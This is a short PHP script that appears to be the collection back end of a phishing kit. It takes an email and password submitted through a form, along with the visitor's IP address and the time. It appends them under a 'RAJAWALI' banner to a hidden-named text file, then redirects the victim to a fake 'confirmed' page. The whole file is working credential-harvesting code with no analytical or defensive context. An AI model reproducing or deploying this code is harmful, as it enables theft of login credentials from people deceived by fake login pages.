<?php
$file = "_______dwfnik3yt5w84o9_____________.txt";
$email = $_POST['email'];
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");


$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "_________________(RAJAWALI)_________________");
fwrite($handle, "\n");
fwrite($handle, "Email         : ");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "Password      : ");
fwrite($handle, "$password");
fwrite($handle, "\n");
fwrite($handle, "Tanggal Login : ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "Ip Address    : ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "_________________(RAJAWALI)_________________");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"confirmed.htm\";
// -->
</script>";
?>